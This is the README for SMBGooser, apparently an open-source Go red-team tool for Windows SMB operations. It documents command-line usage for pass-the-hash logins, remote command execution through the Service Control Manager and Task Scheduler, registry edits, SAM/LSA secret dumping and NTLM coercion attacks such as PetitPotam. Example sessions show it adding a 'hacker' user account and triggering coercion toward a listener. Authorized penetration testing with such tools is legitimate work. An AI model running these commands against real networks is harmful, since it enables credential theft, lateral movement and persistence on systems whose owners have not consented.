# SMBGooser 🪿

<div align="center">

![SMBGooser](smbgooser.jpg)

![SMBGooser](https://img.shields.io/badge/SMBGooser-v0.1.0-green)
![Go](https://img.shields.io/badge/Go-1.21+-blue)
![License](https://img.shields.io/badge/License-MIT-yellow)

**A Red Team SMB Library & Tool for Windows Network Operations**

</div>

---

## Features

- **SMB2/SMB3 Protocol Support** - Connect to modern Windows file shares
- **Multiple Authentication Methods**:
  - NTLM (password or pass-the-hash)
  - Kerberos (ccache/keytab)
  - Certificate/PKINIT
- **SOCKS5 Proxy Support** - Route traffic through proxies for pivoting
- **File Operations** - Browse, read, write, upload, download files
- **Named Pipe Exploration** - Enumerate and interact with named pipes
- **DCE/RPC Operations** - Bind to RPC interfaces and call methods
- **Remote Execution** - Execute commands via SCM or Task Scheduler
- **Remote Registry** - Query, add, and delete registry keys/values
- **Service Enumeration** - List, query, and control Windows services
- **User Enumeration** - Enumerate users and groups via SAMR
- **Secrets Dumping** - Extract SAM hashes from remote machines
- **Coercion Attacks** - PetitPotam, SpoolSample, DFSCoerce, ShadowCoerce
- **Discovery Tools** - Scan for new coercion methods via opnum enumeration
- **Message Signing & Encryption** - Support for SMB3 encryption

## Installation

```bash
go install github.com/ineffectivecoder/SMBGooser/cmd/smbgooser@latest
```

Or build from source:

```bash
git clone https://github.com/ineffectivecoder/SMBGooser.git
cd SMBGooser
go build -o smbgooser ./cmd/smbgooser
```

## Quick Start

```bash
# Connect with password (interactive mode)
./smbgooser -u username -t 192.168.1.10 -d DOMAIN -p 'password'

# Pass-the-hash
./smbgooser -u username -t 192.168.1.10 -d DOMAIN -H aad3b435b51404eeaad3b435b51404ee

# Kerberos (with ccache)
export KRB5CCNAME=/path/to/ticket.ccache
./smbgooser -t 192.168.1.10 -d DOMAIN

# With SOCKS5 proxy (pivoting)
./smbgooser -t 192.168.1.10 -u admin -p pass -s 127.0.0.1:1080

# Non-interactive: execute commands and exit
./smbgooser -t 192.168.1.10 -u admin -d DOMAIN -p pass -x 'sessions'
./smbgooser -t 192.168.1.10 -u admin -d DOMAIN -p pass -x 'shares; use C$; ls'
```

## Interactive Commands

### Core

| Command | Description |
|---------|-------------|
| `help` | Show available commands |
| `whoami` | Show current user and session info |
| `info` | Show connection info |
| `exit` | Exit the shell |

### Share Operations

| Command | Description |
|---------|-------------|
| `shares` | List available shares |
| `use <share>` | Connect to a share |
| `disconnect` | Disconnect from current share |
| `shareaccess` | Check read/write access on shares |

### File Operations

| Command | Description |
|---------|-------------|
| `ls [path]` | List directory contents |
| `cd <path>` | Change directory |
| `pwd` | Print working directory |
| `cat <file>` | Display file contents |
| `get <file>` | Download a file |
| `put <local> <remote>` | Upload a file |
| `mkdir <dir>` | Create directory |
| `rm <file>` | Delete file |
| `find <pattern>` | Search for files |

### Pipe & RPC Operations

| Command | Description |
|---------|-------------|
| `pipes` | Enumerate named pipes |
| `rpc interfaces` | List known RPC interfaces |
| `rpc bind <iface>` | Bind to RPC interface |
| `rpc call <opnum>` | Call RPC method |
| `rpc scan <iface> <ip>` | Scan for coercion methods |
| `pipe open <name>` | Open pipe for raw I/O |
| `pipe transact <hex>` | Send/receive on pipe |

### Remote Execution

| Command | Description |
|---------|-------------|
| `exec <command>` | Execute command via SCM (svcctl) |
| `atexec <command>` | Execute command via Task Scheduler |

### Remote Registry

| Command | Description |
|---------|-------------|
| `reg query <key> [value]` | Query registry key/value |
| `reg add <key> <value> <type> <data>` | Set registry value |
| `reg delete <key> [value]` | Delete registry key/value |

### Service Control

| Command | Description |
|---------|-------------|
| `svc list` | List all services |
| `svc query <name>` | Query service status |
| `svc start <name>` | Start a service |
| `svc stop <name>` | Stop a service |

### Secrets & Recon

| Command | Description |
|---------|-------------|
| `secretsdump` | Dump SAM + LSA secrets (default) |
| `secretsdump --sam-only` | Dump SAM hashes only |
| `secretsdump --lsa-only` | Dump LSA secrets only |
| `users` | Enumerate domain users |
| `users -g` | Enumerate domain groups |

### Coercion Attacks

| Command | Description |
|---------|-------------|
| `coerce petitpotam <listener>` | PetitPotam attack (MS-EFSR) |
| `coerce spoolsample <listener>` | PrinterBug attack (MS-RPRN) |
| `coerce dfscoerce <listener>` | DFSCoerce attack (MS-DFSNM) |
| `coerce shadowcoerce <listener>` | ShadowCoerce attack (MS-FSRVP) |

## Examples

### Remote Execution

```
[SMBGooser] 192.168.1.10> exec "whoami > C:\temp\out.txt"
[*] Creating SCMR client...
[*] Opening Service Control Manager...
[*] Executing command via temporary service...
[+] Command executed successfully

[SMBGooser] 192.168.1.10> atexec "net user hacker Pass123! /add"
[*] Creating Task Scheduler client...
[*] Executing command via scheduled task...
[+] Command executed successfully via Task Scheduler
```

### Registry Operations

```
[SMBGooser] 192.168.1.10> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion ProductName
[*] Connecting to remote registry...
[*] Opening HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion...
    ProductName          REG_SZ          Windows 10 Pro
```

### Service Enumeration

```
[SMBGooser] 192.168.1.10> svc query Spooler

  Service: Spooler
  State:   Running
  Type:    Win32
```

### User Enumeration

```
[SMBGooser] 192.168.1.10> users -d CORP

  Users in CORP:
  --------------------------------------------------
  RID: 500     Administrator
  RID: 501     Guest
  RID: 1001    john.doe
  RID: 1002    jane.smith
```

### Coercion Attacks

```
[SMBGooser] 192.168.1.10> coerce petitpotam 192.168.1.100
[*] Triggering PetitPotam via EfsRpcOpenFileRaw...
[+] Coercion triggered! Check your listener.
```

## Library Usage

SMBGooser can also be used as a Go library:

```go
package main

import (
    "context"
    "github.com/ineffectivecoder/SMBGooser/pkg/smb"
    "github.com/ineffectivecoder/SMBGooser/pkg/auth"
)

func main() {
    ctx := context.Background()
    
    // Connect (with optional SOCKS5 proxy)
    config := smb.DefaultClientConfig()
    config.Socks5URL = "socks5://127.0.0.1:1080"
    
    client := smb.NewClientWithConfig(config)
    client.Connect(ctx, "192.168.1.10", 445)
    
    // Authenticate
    creds := auth.NewPasswordCredentials("DOMAIN", "user", "pass")
    client.Authenticate(ctx, creds)
    
    // Use RPC packages
    // pkg/svcctl - Service Control Manager
    // pkg/tsch   - Task Scheduler
    // pkg/rrp    - Remote Registry
    // pkg/samr   - User/Group Enumeration
}
```

## Disclaimer

This tool is intended for authorized security testing and research purposes only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.

## License

MIT License - See [LICENSE](LICENSE) for details.
